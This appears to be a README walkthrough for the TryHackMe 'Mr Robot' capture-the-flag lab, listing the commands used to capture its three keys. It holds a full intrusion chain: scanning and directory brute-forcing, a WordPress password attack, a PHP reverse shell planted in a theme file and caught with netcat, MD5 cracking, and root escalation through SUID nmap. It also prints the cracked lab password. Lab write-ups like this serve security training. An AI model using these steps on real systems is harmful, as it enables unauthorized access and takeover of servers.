# MRrobotCTF
#created this repo as a guide to mrrobot CTF/Vuln machine follow the steps have fun !
QMARK CTF



Steps:

#download the vpn file to connect tryhackme server

#save in desktop 

#open terminal in the folder and type command [sudo openvpn filename.octozion.ovpn]     //if you dont have openvpn installed follow this link https://openvpn.net/community-resources/installing-openvpn/

#Join the room

#Task 1:instructions 

#Task2 :

    KEY1 & 2 & 3 :
    #Cope the IP Address to the clipboard
    #Open terminal  make a folder to work with this CTF using the command [mkdir]
    #Run nmap on the ip address [nmap -sV -A -sC 10.10.241.161] | tee nmapout.txt]       //network scan and storing the result in nmapout.txt
    #Port  80/443 is open
    #Use burp suit > proxy > open browser > intercept off and paste the ip address
    #Use gobuster with the wordlist downloaded from my githum [sudo gobuster dir  -u http://10.10.144.191/ -w ~/Downloads/mr.robot-CTF-/wordlistgobuster.txt -x .txt]
    #Found /wp-admin , robots.txt
    #check both the url
    #on checking robots.txt you'll get they open the [IP/key-1-of-3.txt] **1st key**
    
    #Use wp-scan [wpscan --url 10.10.86.19/wp-login.php -U 'elliot' -P wordlist.dic]
    #Download the shell https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
    #inside wp dashboard go to  appreance and editor
    #edit in 404.php code ane save and use netcat [nc -lvnp 1234 ]
    #To make the session more stabel [ python -c 'import pty;pty.spawn("/bin/bash")' ]
    #now to goto /home/robot two file now use command [cat password.raw-md5 ]
    #copy the md5 has and use john the ripper and save as mrrobot.hash
    #use john the ripper tool   [john 'md5 (1).hash' --wordlist=fsocity.dic --format=Raw-MD5]
    #got the password abcdefghijklmnopqrstuvwxyz
    #type su robot and type the password and cat the **2nd key**
    
    #use the command [find / -perm /4000 -print 2>/dev/null] which checks the privilage excaltion to goto root
    #nmap is inside it 
    #get the command for privillage excalation
    #nmap --interactive     //command to shift nmap interactive mode
    #nmap> !sh      //command to shit root
    # ls /root/     //gives the third key
    # cat the final **3rd key**
